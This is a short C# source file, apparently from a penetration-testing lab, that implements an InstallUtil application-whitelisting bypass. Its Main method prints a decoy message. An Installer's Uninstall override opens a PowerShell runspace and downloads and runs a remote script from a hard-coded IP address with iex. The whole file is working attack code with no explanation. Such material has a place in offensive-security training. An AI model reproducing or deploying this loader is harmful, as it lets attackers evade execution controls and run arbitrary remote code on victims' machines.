using System;
using System.Configuration.Install;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace Exploit
{
    public class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Nothing going on in this binary.");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            String cmd = "(New-Object Net.WebClient).DownloadString('http://192.168.49.77/web/run.txt') | iex";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}